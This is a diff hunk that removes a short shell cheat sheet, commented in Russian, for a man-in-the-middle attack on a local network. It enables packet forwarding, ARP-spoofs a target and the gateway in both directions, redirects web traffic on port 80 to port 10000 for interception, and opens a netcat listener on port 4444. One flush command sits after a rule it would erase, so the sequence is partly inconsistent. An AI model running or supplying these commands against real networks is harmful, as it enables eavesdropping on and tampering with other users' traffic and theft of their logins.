@@ -1,9 +1,0 @@
-echo 1 > /proc/sys/net/ipv4/ip_forward          # Включить перессылку пакетов
-
-arpspoof -i eth0 -t target source               # ARP spoof target - ip атакуемого
-arpspoof -i eth0 -t source target               #           source - ip комутатора
-
-iptables -I FORWARD -j NFQUEUE --queue-num 0    # Создать очередь пакетов на своем компьютере
-iptables --flush                                # Перезагрузить конфигурацию iptables
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000 # Перенаправлять весь трафик который приходит на порт 80 на порт 10000
-nc -vv -l -p 4444                               # Открыть порт 4444 для прослушивания
